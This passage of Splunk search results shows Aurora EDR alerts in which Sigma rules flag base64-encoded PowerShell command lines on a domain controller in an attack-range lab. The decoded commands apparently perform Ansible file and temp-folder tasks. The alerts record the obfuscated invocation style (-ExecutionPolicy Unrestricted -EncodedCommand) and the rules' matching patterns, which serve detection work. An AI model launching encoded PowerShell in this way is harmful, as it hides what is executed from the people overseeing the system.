Folder\",\"Security_UserID\":\"\",\"Source\":\"Security\",\"SubjectDomainName\":\"ATTACKRANGE\",\"SubjectLogonId\":\"0xfa9ae\",\"SubjectUserName\":\"Administrator\",\"SubjectUserSid\":\"S-1-5-21-3651310434-676309764-3668584008-500\",\"TargetDomainName\":\"-\",\"TargetLogonId\":\"0x0\",\"TargetUserName\":\"-\",\"TargetUserSid\":\"S-1-0-0\",\"Task\":\"13312\",\"TimeCreated_SystemTime\":\"2022-03-18T16:09:58.4100222Z\",\"TokenElevationType\":\"%%1936\",\"Version\":\"2\",\"level\":\"notice\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:10:05Z\"}","_time":"2022-03-18T16:10:06.000+0000","eventtype":"nix-all-logs","host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"\\\":\\\\\\\\.\\\\\\\\..\\\\.\\\"_/_/_@\\\":\\\\\\\\\\\\\\\\\\\\\\\\\\\\.\\\"","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","timestamp":"none"}}
{"preview":false,"result":{"_raw":"{\"CommandLine\":\"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand UwBlAHQALQBTAHQAcgBpAGMAdABNAG8AZABlACAALQBWAGUAcgBzAGkAbwBuACAATABhAHQAZQBzAHQACgBSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAnAEMAOgBcAFUAcwBlAHIAcwBcAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGEAbgBzAGkAYgBsAGUALQB0AG0AcAAtADEANgA0ADcANgAxADkANwA5ADEALgA4ADAAMQA0ADUALQAxADgAOAAzADUAOQAzAC0AMgAzADMANgAzADQANAAzADcAMQA3ADgAMgAxADEAXAAuACcAIAAtAEYAbwByAGMAZQAgAC0AUgBlAGMAdQByAHMAZQA7AAoASQBmACAAKAAtAG4AbwB0ACAAJAA/ACkAIAB7ACAASQBmACAAKABHAGUAdAAtAFYAYQByAGkAYQBiAGwAZQAgAEwAQQBTAFQARQBYAEkAVABDAE8ARABFACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACkAIAB7ACAAZQB4AGkAdAAgACQATABBAFMAVABFAFgASQBUAEMATwBEAEUAIAB9ACAARQBsAHMAZQAgAHsAIABlAHgAaQB0ACAAMQAgAH0AIAB9AA==\",\"Computer\":\"win-dc-jhernandez-17500-200.attackrange.local\",\"Correlation_ActivityID\":\"\",\"EventID\":\"4688\",\"EventRecordID\":\"304799\",\"Execution_ProcessID\":\"4\",\"Execution_ThreadID\":\"136\",\"Image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"Keywords\":\"0\",\"Level\":\"0\",\"MandatoryLabel\":\"S-1-16-12288\",\"Match_Strings\":\"' -E' in CommandLine, ' -E' in CommandLine, ' UwB' in CommandLine\",\"Module\":\"Sigma\",\"NewProcessId\":\"3368\",\"Opcode\":\"0\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"ProcessId\":\"364\",\"Provider_Guid\":\"{54849625-5478-4994-A5BA-3E3B0328C30D}\",\"Provider_Name\":\"Microsoft-Windows-Security-Auditing\",\"Rule_Author\":\"Florian Roth, Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy, Anton Kutepov, oscd.community\",\"Rule_Description\":\"Detects suspicious powershell process starts with base64 encoded commands (e.g. Emotet)\",\"Rule_FalsePositives\":\"\",\"Rule_Id\":\"ca2092a1-c273-4878-9b4b-0d60115bf5ea\",\"Rule_Level\":\"high\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/process_creation/proc_creation_win_susp_powershell_enc_cmd.yml\",\"Rule_Modified\":\"2021/03/02\",\"Rule_Path\":\"public\\\\windows\\\\process_creation\\\\proc_creation_win_susp_powershell_enc_cmd.yml\",\"Rule_References\":\"https://app.any.run/tasks/6217d77d-3189-4db2-a957-8ab239f3e01e\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Suspicious Encoded PowerShell Command Line\",\"Security_UserID\":\"\",\"Source\":\"Security\",\"SubjectDomainName\":\"ATTACKRANGE\",\"SubjectLogonId\":\"0xede69\",\"SubjectUserName\":\"Administrator\",\"SubjectUserSid\":\"S-1-5-21-3651310434-676309764-3668584008-500\",\"TargetDomainName\":\"-\",\"TargetLogonId\":\"0x0\",\"TargetUserName\":\"-\",\"TargetUserSid\":\"S-1-0-0\",\"Task\":\"13312\",\"TimeCreated_SystemTime\":\"2022-03-18T16:09:56.4209187Z\",\"TokenElevationType\":\"%%1936\",\"Version\":\"2\",\"level\":\"warning\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:10:05Z\"}","_time":"2022-03-18T16:10:06.000+0000","eventtype":"nix-all-logs","host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"\\\":\\\\\\\\\\\\\\\\.\\\\.\\\"_-_-_-__-_/==\",\"\":\"----..\",\"","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","timestamp":"none"}}
{"preview":false,"result":{"_raw":"{\"CommandLine\":\"PowerShell  -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand UABvAHcAZQByAFMAaABlAGwAbAAgAC0ATgBvAFAAcgBvAGYAaQBsAGUAIAAtAE4AbwBuAEkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAC0ARQB4AGUAYwB1AHQAaQBvAG4AUABvAGwAaQBjAHkAIABVAG4AcgBlAHMAdAByAGkAYwB0AGUAZAAgAC0ARQBuAGMAbwBkAGUAZABDAG8AbQBtAGEAbgBkACAASgBnAEIAagBBAEcAZwBBAFkAdwBCAHcAQQBDADQAQQBZAHcAQgB2AEEARwAwAEEASQBBAEEAMgBBAEQAVQBBAE0AQQBBAHcAQQBEAEUAQQBJAEEAQQArAEEAQwBBAEEASgBBAEIAdQBBAEgAVQBBAGIAQQBCAHMAQQBBAG8AQQBKAEEAQgBsAEEASABnAEEAWgBRAEIAagBBAEYAOABBAGQAdwBCAHkAQQBHAEUAQQBjAEEAQgB3AEEARwBVAEEAYwBnAEIAZgBBAEgATQBBAGQAQQBCAHkAQQBDAEEAQQBQAFEAQQBnAEEAQwBRAEEAYQBRAEIAdQBBAEgAQQBBAGQAUQBCADAAQQBDAEEAQQBmAEEAQQBnAEEARQA4AEEAZABRAEIAMABBAEMAMABBAFUAdwBCADAAQQBIAEkAQQBhAFEAQgB1AEEARwBjAEEAQwBnAEEAawBBAEgATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBmAEEASABBAEEAWQBRAEIAeQBBAEgAUQBBAGMAdwBBAGcAQQBEADAAQQBJAEEAQQBrAEEARwBVAEEAZQBBAEIAbABBAEcATQBBAFgAdwBCADMAQQBIAEkAQQBZAFEAQgB3AEEASABBAEEAWgBRAEIAeQBBAEYAOABBAGMAdwBCADAAQQBIAEkAQQBMAGcAQgBUAEEASABBAEEAYgBBAEIAcABBAEgAUQBBAEsAQQBCAEEAQQBDAGcAQQBJAGcAQgBnAEEARABBAEEAWQBBAEEAdwBBAEcAQQBBAE0AQQBCAGcAQQBEAEEAQQBJAGcAQQBwAEEAQwB3AEEASQBBAEEAeQBBAEMAdwBBAEkAQQBCAGIAQQBGAE0AQQBkAEEAQgB5AEEARwBrAEEAYgBnAEIAbgBBAEYATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBQAEEASABBAEEAZABBAEIAcABBAEcAOABBAGIAZwBCAHoAQQBGADAAQQBPAGcAQQA2AEEARgBJAEEAWgBRAEIAdABBAEcAOABBAGQAZwBCAGwAQQBFAFUAQQBiAFEAQgB3AEEASABRAEEAZQBRAEIARgBBAEcANABBAGQAQQBCAHkAQQBHAGsAQQBaAFEAQgB6AEEAQwBrAEEAQwBnAEIASgBBAEcAWQBBAEkAQQBBAG8AQQBDADAAQQBiAGcAQgB2AEEASABRAEEASQBBAEEAawBBAEgATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBmAEEASABBAEEAWQBRAEIAeQBBAEgAUQBBAGMAdwBBAHUAQQBFAHcAQQBaAFEAQgB1AEEARwBjAEEAZABBAEIAbwBBAEMAQQBBAEwAUQBCAGwAQQBIAEUAQQBJAEEAQQB5AEEAQwBrAEEASQBBAEIANwBBAEMAQQBBAGQAQQBCAG8AQQBIAEkAQQBiAHcAQgAzAEEAQwBBAEEASQBnAEIAcABBAEcANABBAGQAZwBCAGgAQQBHAHcAQQBhAFEAQgBrAEEAQwBBAEEAYwBBAEIAaABBAEgAawBBAGIAQQBCAHYAQQBHAEUAQQBaAEEAQQBpAEEAQwBBAEEAZgBRAEEASwBBAEYATQBBAFoAUQBCADAAQQBDADAAQQBWAGcAQgBoAEEASABJAEEAYQBRAEIAaABBAEcASQBBAGIAQQBCAGwAQQBDAEEAQQBMAFEAQgBPAEEARwBFAEEAYgBRAEIAbABBAEMAQQBBAGEAZwBCAHoAQQBHADgAQQBiAGcAQgBmAEEASABJAEEAWQBRAEIAMwBBAEMAQQBBAEwAUQBCAFcAQQBHAEUAQQBiAEEAQgAxAEEARwBVAEEASQBBAEEAawBBAEgATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBmAEEASABBAEEAWQBRAEIAeQBBAEgAUQBBAGMAdwBCAGIAQQBEAEUAQQBYAFEAQQBLAEEAQwBRAEEAWgBRAEIANABBAEcAVQBBAFkAdwBCAGYAQQBIAGMAQQBjAGcAQgBoAEEASABBAEEAYwBBAEIAbABBAEgASQBBAEkAQQBBADkAQQBDAEEAQQBXAHcAQgBUAEEARwBNAEEAYwBnAEIAcABBAEgAQQBBAGQAQQBCAEMAQQBHAHcAQQBiAHcAQgBqAEEARwBzAEEAWABRAEEANgBBAEQAbwBBAFEAdwBCAHkAQQBHAFUAQQBZAFEAQgAwAEEARwBVAEEASwBBAEEAawBBAEgATQBBAGMAQQBCAHMAQQBHAGsAQQBkAEEAQgBmAEEASABBAEEAWQBRAEIAeQBBAEgAUQBBAGMAdwBCAGIAQQBEAEEAQQBYAFEAQQBwAEEAQQBvAEEASgBnAEEAawBBAEcAVQBBAGUAQQBCAGwAQQBHAE0AQQBYAHcAQgAzAEEASABJAEEAWQBRAEIAdwBBAEgAQQBBAFoAUQBCAHkAQQBBAD0APQA=\",\"Computer\":\"win-dc-jhernandez-17500-200.attackrange.local\",\"Correlation_ActivityID\":\"\",\"EventID\":\"4688\",\"EventRecordID\":\"304766\",\"Execution_ProcessID\":\"4\",\"Execution_ThreadID\":\"288\",\"Image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"Keywords\":\"0\",\"Level\":\"0\",\"MandatoryLabel\":\"S-1-16-12288\",\"Match_Strings\":\"' -Enco' in CommandLine, \\\\powershell.exe in Image\",\"Module\":\"Sigma\",\"NewProcessId\":\"2320\",\"Opcode\":\"0\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"ProcessId\":\"4656\",\"Provider_Guid\":\"{54849625-5478-4994-A5BA-3E3B0328C30D}\",\"Provider_Name\":\"Microsoft-Windows-Security-Auditing\",\"Rule_Author\":\"frack113\",\"Rule_Description\":\"Commandline to lauch powershell with a base64 payload\",\"Rule_FalsePositives\":\"Unknown\",\"Rule_Id\":\"fb843269-508c-4b76-8b8d-88679db22ce7\",\"Rule_Level\":\"medium\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/process_creation/proc_creation_win_susp_powershell_encode.yml\",\"Rule_Modified\":\"2022/02/10\",\"Rule_Path\":\"public\\\\windows\\\\process_creation\\\\proc_creation_win_susp_powershell_encode.yml\",\"Rule_References\":\"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md#atomic-test-20---powershell-invoke-known-malicious-cmdlets, https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/, https://mikefrobbins.com/2017/06/15/simple-obfuscation-with-powershell-using-base64-encoding/\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Suspicious Execution of Powershell with Base64\",\"Security_UserID\":\"\",\"Source\":\"Security\",\"SubjectDomainName\":\"ATTACKRANGE\",\"SubjectLogonId\":\"0xede69\",\"SubjectUserName\":\"Administrator\",\"SubjectUserSid\":\"S-1-5-21-3651310434-676309764-3668584008-500\",\"TargetDomainName\":\"-\",\"TargetLogonId\":\"0x0\",\"TargetUserName\":\"-\",\"TargetUserSid\":\"S-1-0-0\",\"Task\":\"13312\",\"TimeCreated_SystemTime\":\"2022-03-18T16:09:55.3002964Z\",\"TokenElevationType\":\"%%1936\",\"Version\":\"2\",\"level\":\"notice\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:10:05Z\"}","_time":"2022-03-18T16:10:06.000+0000","eventtype":"nix-all-logs","host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"__-_-_-__-_=\",\"\":\"----..\",\"\":\"\",\"\":\"\",\"\":\"\",\"","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","timestamp":"none"}}
{"preview":false,"result":{"_raw":"{\"CommandLine\":\"PowerShell  -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand YgBlAGcAaQBuACAAewAKACQAcABhAHQAaAAgAD0AIAAnAEMAOgBcAFUAcwBlAHIAcwBcAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGEAbgBzAGkAYgBsAGUALQB0AG0AcAAtADEANgA0ADcANgAxADkANwA5ADEALgA4ADAAMQA0ADUALQAxADgAOAAzADUAOQAzAC0AMgAzADMANgAzADQANAAzADcAMQA3ADgAMgAxADEAXABzAG8AdQByAGMAZQAnAAoAJABEAGUAYgB1AGcAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAEMAbwBuAHQAaQBuAHUAZQAiAAoAJABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAdABvAHAAIgAKAFMAZQB0AC0AUwB0AHIAaQBjAHQATQBvAGQAZQAgAC0AVgBlAHIAcwBpAG8AbgAgADIACgAkAGYAZAAgAD0AIABbAFMAeQBzAHQAZQBtAC4ASQBPAC4ARgBpAGwAZQBdADoAOgBDAHIAZQBhAHQAZQAoACQAcABhAHQAaAApAAoAJABzAGgAYQAxACAAPQAgAFsAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAFMASABBADEAQwByAHkAcAB0AG8AUwBlAHIAdgBpAGMAZQBQAHIAbwB2AGkAZABlAHIAXQA6ADoAQwByAGUAYQB0AGUAKAApAAoAJABiAHkAdABlAHMAIAA9ACAAQAAoACkAIAAjAGkAbgBpAHQAaQBhAGwAaQB6AGUAIABmAG8AcgAgAGUAbQBwAHQAeQAgAGYAaQBsAGUAIABjAGEAcwBlAAoAfQAKAHAAcgBvAGMAZQBzAHMAIAB7AAoAJABiAHkAdABlAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAaQBuAHAAdQB0ACkACgAkAHMAaABhADEALgBUAHIAYQBuAHMAZgBvAHIAbQBCAGwAbwBjAGsAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAAsACAAJABiAHkAdABlAHMALAAgADAAKQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgAkAGYAZAAuAFcAcgBpAHQAZQAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkACgB9AAoAZQBuAGQAIAB7AAoAJABzAGgAYQAxAC4AVAByAGEAbgBzAGYAbwByAG0ARgBpAG4AYQBsAEIAbABvAGMAawAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAwACkAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAJABoAGEAcwBoACAAPQAgAFsAUwB5AHMAdABlAG0ALgBCAGkAdABDAG8AbgB2AGUAcgB0AGUAcgBdADoAOgBUAG8AUwB0AHIAaQBuAGcAKAAkAHMAaABhADEALgBIAGEAcwBoACkALgBSAGUAcABsAGEAYwBlACgAIgAtACIALAAgACIAIgApAC4AVABvAEwAbwB3AGUAcgBJAG4AdgBhAHIAaQBhAG4AdAAoACkACgAkAGYAZAAuAEMAbABvAHMAZQAoACkACgBXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACIAewAiACIAcwBoAGEAMQAiACIAOgAiACIAJABoAGEAcwBoACIAIgB9ACIACgB9AA==\",\"Computer\":\"win-dc-jhernandez-17500-200.attackrange.local\",\"Correlation_ActivityID\":\"\",\"EventID\":\"4688\",\"EventRecordID\":\"304741\",\"Execution_ProcessID\":\"4\",\"Execution_ThreadID\":\"288\",\"Image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"Keywords\":\"0\",\"Level\":\"0\",\"MandatoryLabel\":\"S-1-16-12288\",\"Match_Strings\":\"6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZw in CommandLine\",\"Module\":\"Sigma\",\"NewProcessId\":\"1204\",\"Opcode\":\"0\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"ProcessId\":\"4816\",\"Provider_Guid\":\"{54849625-5478-4994-A5BA-3E3B0328C30D}\",\"Provider_Name\":\"Microsoft-Windows-Security-Auditing\",\"Rule_Author\":\"Florian Roth\",\"Rule_Description\":\"Detects a base64 encoded FromBase64String keyword in a process command line\",\"Rule_FalsePositives\":\"Unknown\",\"Rule_Id\":\"fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c\",\"Rule_Level\":\"critical\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/process_creation/proc_creation_win_encoded_frombase64string.yml\",\"Rule_Modified\":\"2022/03/07\",\"Rule_Path\":\"public\\\\windows\\\\process_creation\\\\proc_creation_win_encoded_frombase64string.yml\",\"Rule_References\":\"\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Encoded FromBase64String\",\"Security_UserID\":\"\",\"Source\":\"Security\",\"SubjectDomainName\":\"ATTACKRANGE\",\"SubjectLogonId\":\"0xede69\",\"SubjectUserName\":\"Administrator\",\"SubjectUserSid\":\"S-1-5-21-3651310434-676309764-3668584008-500\",\"TargetDomainName\":\"-\",\"TargetLogonId\":\"0x0\",\"TargetUserName\":\"-\",\"TargetUserSid\":\"S-1-0-0\",\"Task\":\"13312\",\"TimeCreated_SystemTime\":\"2022-03-18T16:09:54.8637423Z\",\"TokenElevationType\":\"%%1936\",\"Version\":\"2\",\"level\":\"alert\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:10:05Z\"}","_time":"2022-03-18T16:10:06.000+0000","eventtype":["nix-all-logs","nix_errors"],"host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"__-_-_-__-_==\",\"\":\"----..\",\"\":\"\",\"\":\"\",\"\":\"\",","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","tag":"error","tag::eventtype":"error","timestamp":"none"}}
{"preview":false,"result":{"_raw":"{\"CommandLine\":\"PowerShell  -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand YgBlAGcAaQBuACAAewAKACQAcABhAHQAaAAgAD0AIAAnAEMAOgBcAFUAcwBlAHIAcwBcAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGEAbgBzAGkAYgBsAGUALQB0AG0AcAAtADEANgA0ADcANgAxADkANwA5ADEALgA4ADAAMQA0ADUALQAxADgAOAAzADUAOQAzAC0AMgAzADMANgAzADQANAAzADcAMQA3ADgAMgAxADEAXABzAG8AdQByAGMAZQAnAAoAJABEAGUAYgB1AGcAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAEMAbwBuAHQAaQBuAHUAZQAiAAoAJABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAdABvAHAAIgAKAFMAZQB0AC0AUwB0AHIAaQBjAHQATQBvAGQAZQAgAC0AVgBlAHIAcwBpAG8AbgAgADIACgAkAGYAZAAgAD0AIABbAFMAeQBzAHQAZQBtAC4ASQBPAC4ARgBpAGwAZQBdADoAOgBDAHIAZQBhAHQAZQAoACQAcABhAHQAaAApAAoAJABzAGgAYQAxACAAPQAgAFsAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAFMASABBADEAQwByAHkAcAB0AG8AUwBlAHIAdgBpAGMAZQBQAHIAbwB2AGkAZABlAHIAXQA6ADoAQwByAGUAYQB0AGUAKAApAAoAJABiAHkAdABlAHMAIAA9ACAAQAAoACkAIAAjAGkAbgBpAHQAaQBhAGwAaQB6AGUAIABmAG8AcgAgAGUAbQBwAHQAeQAgAGYAaQBsAGUAIABjAGEAcwBlAAoAfQAKAHAAcgBvAGMAZQBzAHMAIAB7AAoAJABiAHkAdABlAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAaQBuAHAAdQB0ACkACgAkAHMAaABhADEALgBUAHIAYQBuAHMAZgBvAHIAbQBCAGwAbwBjAGsAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAAsACAAJABiAHkAdABlAHMALAAgADAAKQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgAkAGYAZAAuAFcAcgBpAHQAZQAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkACgB9AAoAZQBuAGQAIAB7AAoAJABzAGgAYQAxAC4AVAByAGEAbgBzAGYAbwByAG0ARgBpAG4AYQBsAEIAbABvAGMAawAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAwACkAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAJABoAGEAcwBoACAAPQAgAFsAUwB5AHMAdABlAG0ALgBCAGkAdABDAG8AbgB2AGUAcgB0AGUAcgBdADoAOgBUAG8AUwB0AHIAaQBuAGcAKAAkAHMAaABhADEALgBIAGEAcwBoACkALgBSAGUAcABsAGEAYwBlACgAIgAtACIALAAgACIAIgApAC4AVABvAEwAbwB3AGUAcgBJAG4AdgBhAHIAaQBhAG4AdAAoACkACgAkAGYAZAAuAEMAbABvAHMAZQAoACkACgBXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACIAewAiACIAcwBoAGEAMQAiACIAOgAiACIAJABoAGEAcwBoACIAIgB9ACIACgB9AA==\",\"Computer\":\"win-dc-jhernandez-17500-200.attackrange.local\",\"Correlation_ActivityID\":\"\",\"EventID\":\"4688\",\"EventRecordID\":\"304741\",\"Execution_ProcessID\":\"4\",\"Execution_ThreadID\":\"288\",\"Image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"Keywords\":\"0\",\"Level\":\"0\",\"MandatoryLabel\":\"S-1-16-12288\",\"Match_Strings\":\"' -Enco' in CommandLine, \\\\powershell.exe in Image\",\"Module\":\"Sigma\",\"NewProcessId\":\"1204\",\"Opcode\":\"0\",\"ParentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"ProcessId\":\"4816\",\"Provider_Guid\":\"{54849625-5478-4994-A5BA-3E3B0328C30D}\",\"Provider_Name\":\"Microsoft-Windows-Security-Auditing\",\"Rule_Author\":\"frack113\",\"Rule_Description\":\"Commandline to lauch powershell with a base64 payload\",\"Rule_FalsePositives\":\"Unknown\",\"Rule_Id\":\"fb843269-508c-4b76-8b8d-88679db22ce7\",\"Rule_Level\":\"medium\",\"Rule_Link\":\"https://github.com/SigmaHQ/sigma/blob/0.20-3312-gfbf1b845/rules/windows/process_creation/proc_creation_win_susp_powershell_encode.yml\",\"Rule_Modified\":\"2022/02/10\",\"Rule_Path\":\"public\\\\windows\\\\process_creation\\\\proc_creation_win_susp_powershell_encode.yml\",\"Rule_References\":\"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md#atomic-test-20---powershell-invoke-known-malicious-cmdlets, https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/, https://mikefrobbins.com/2017/06/15/simple-obfuscation-with-powershell-using-base64-encoding/\",\"Rule_Sigtype\":\"public\",\"Rule_Title\":\"Suspicious Execution of Powershell with Base64\",\"Security_UserID\":\"\",\"Source\":\"Security\",\"SubjectDomainName\":\"ATTACKRANGE\",\"SubjectLogonId\":\"0xede69\",\"SubjectUserName\":\"Administrator\",\"SubjectUserSid\":\"S-1-5-21-3651310434-676309764-3668584008-500\",\"TargetDomainName\":\"-\",\"TargetLogonId\":\"0x0\",\"TargetUserName\":\"-\",\"TargetUserSid\":\"S-1-0-0\",\"Task\":\"13312\",\"TimeCreated_SystemTime\":\"2022-03-18T16:09:54.8637423Z\",\"TokenElevationType\":\"%%1936\",\"Version\":\"2\",\"level\":\"notice\",\"msg\":\"Sigma match found\",\"time\":\"2022-03-18T16:10:05Z\"}","_time":"2022-03-18T16:10:06.000+0000","eventtype":"nix-all-logs","host":"WIN-DC-JHERNAND","index":"win","linecount":"1","punct":"{\"\":\"__-_-_-__-_==\",\"\":\"----..\",\"\":\"\",\"\":\"\",\"\":\"\",","source":"C:\\aurora-agent-lite-win-pack\\aurora_alerts.json.log","sourcetype":"aurora-edr","splunk_server":"splunk-server-jhernandez-17500-9244","timestamp":"none"}}
{"preview":false,"result":{"_raw":"{\"CommandLine\":\"C:\\\\Windows\\\\system32\\\\cmd.exe /C PowerShell -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand YgBlAGcAaQBuACAAewAKACQAcABhAHQAaAAgAD0AIAAnAEMAOgBcAFUAcwBlAHIAcwBcAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGEAbgBzAGkAYgBsAGUALQB0AG0AcAAtADEANgA0ADcANgAxADkANwA5ADEALgA4ADAAMQA0ADUALQAxADgAOAAzADUAOQAzAC0AMgAzADMANgAzADQANAAzADcAMQA3ADgAMgAxADEAXABzAG8AdQByAGMAZQAnAAoAJABEAGUAYgB1AGcAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAEMAbwBuAHQAaQBuAHUAZQAiAAoAJABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAdABvAHAAIgAKAFMAZQB0AC0AUwB0AHIAaQBjAHQATQBvAGQAZQAgAC0AVgBlAHIAcwBpAG8AbgAgADIACgAkAGYAZAAgAD0AIABbAFMAeQBzAHQAZQBtAC4ASQBPAC4ARgBpAGwAZQBdADoAOgBDAHIAZQBhAHQAZQAoACQAcABhAHQAaAApAAoAJABzAGgAYQAxACAAPQAgAFsAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBDAHIAeQBwAHQAbwBnAHIAYQBwAGgAeQAuAFMASABBADEAQwByAHkAcAB0AG8AUwBlAHIAdgBpAGMAZQBQAHIAbwB2AGkAZABlAHIAXQA6ADoAQwByAGUAYQB0AGUAKAApAAoAJABiAHkAdABlAHMAIAA9ACAAQAAoACkAIAAjAGkAbgBpAHQAaQBhAGwAaQB6AGUAIABmAG8AcgAgAGUAbQBwAHQAeQAgAGYAaQBsAGUAIABjAGEAcwBlAAoAfQAKAHAAcgBvAGMAZQBzAHMAIAB7AAoAJABiAHkAdABlAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAaQBuAHAAdQB0ACkACgAkAHMAaABhADEALgBUAHIAYQBuAHMAZgBvAHIAbQBCAGwAbwBjAGsAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAAsACAAJABiAHkAdABlAHMALAAgADAAKQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgAkAGYAZAAuAFcAcgBpAHQAZQAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcA